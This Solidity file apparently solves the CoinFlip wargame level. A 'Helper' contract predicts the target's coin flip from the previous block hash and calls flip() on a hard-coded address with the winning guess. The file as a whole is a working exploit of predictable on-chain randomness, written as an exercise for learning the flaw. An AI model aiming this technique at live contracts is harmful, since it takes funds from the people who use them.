// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Helper {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    // address coinFlipContractAddress = 0xd8b934580fcE35a11B58C6D73aDeE468a2833fa8; // Address of the deployed CoinFlip contract
    address coinFlipContractAddress = 0x09f6F184f7cFc6e2aDD7D651fe347c20aCb3DcB6;

    constructor() {
        consecutiveWins = 0;
    }

    function guess() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        //ICoinFlip(coinFlipContractAddress).flip(side);
        require(ICoinFlip(coinFlipContractAddress).flip(side), "Flip failed");

        //call flip with "coinFlip == 1" parameter
    }
}
